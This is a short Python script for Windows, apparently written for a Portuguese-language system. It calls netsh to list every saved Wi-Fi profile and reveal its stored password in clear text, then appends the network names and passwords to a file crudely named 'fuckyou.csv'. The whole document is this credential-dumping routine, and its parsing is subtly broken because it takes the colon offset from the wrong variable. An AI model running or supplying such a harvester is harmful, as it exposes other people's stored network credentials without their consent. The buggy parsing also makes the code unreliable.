#wifi
import subprocess as sp

def get_wifi_password():
    get_wifi = sp.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp860')
    for network in get_wifi.split('\n'):
        if 'Todos os Perfis de Usuários' in network:
            two_point = network.find(':')
            info_network = network[two_point+2:]
            all_networks = sp.check_output(
                ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
                )
            
            for passwords in all_networks.split('\n'):
                if 'Nome SSID' in passwords:
                    two_point1 = network.find(':')
                    names = passwords[two_point1+2:]

                if 'Conteúdo da Chave' in passwords:
                    two_point2 = network.find(':')
                    passwd = passwords[two_point2+2:]
                    get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
                    with open('fuckyou.csv', 'a') as wifi:
                        wifi.write(f'{get_network}')
                    wifi.close()